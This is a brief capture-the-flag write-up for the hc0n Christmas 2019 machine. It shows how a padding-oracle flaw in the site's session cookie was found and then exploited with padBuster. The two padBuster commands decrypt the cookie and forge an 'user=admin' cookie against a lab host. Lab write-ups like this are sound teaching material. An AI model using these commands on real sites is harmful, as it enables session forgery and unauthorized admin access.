# hc0n Christmas CTF - 2019

![](../../.gitbook/assets/41d0cdc8d99a8a3de2758ccbdf637a21.jpeg)

## Enumeration

I started **enumerating the machine using my tool** [**Legion**](https://github.com/carlospolop/legion):

![](../../.gitbook/assets/image%20%2821%29.png)

There are 2 ports open: 80 \(**HTTP**\) and 22 \(**SSH**\)

In the web page you can **register new users**, and I noticed that **the length of the cookie depends on the length of the username** indicated:

![](../../.gitbook/assets/image%20%28311%29.png)

![](../../.gitbook/assets/image%20%28318%29.png)

And if you change some **byte** of the **cookie** you get this error:

![](../../.gitbook/assets/image%20%28109%29.png)

With this information and[ **reading the padding oracle vulnerability**](../../crypto/padding-oracle-priv.md) I was able to exploit it:

```bash
perl ./padBuster.pl http://10.10.231.5/index.php "GVrfxWD0mmxRM0RPLht/oUpybgnBn/Oy" 8 -encoding 0 -cookies "hcon=GVrfxWD0mmxRM0RPLht/oUpybgnBn/Oy"
```

![](../../.gitbook/assets/image%20%2853%29.png)

![](../../.gitbook/assets/image%20%28173%29.png)

**Set user admin:**

```bash
perl ./padBuster.pl http://10.10.231.5/index.php "GVrfxWD0mmxRM0RPLht/oUpybgnBn/Oy" 8 -encoding 0 -cookies "hcon=GVrfxWD0mmxRM0RPLht/oUpybgnBn/Oy" -plaintext "user=admin"
```

![](../../.gitbook/assets/image%20%28271%29.png)



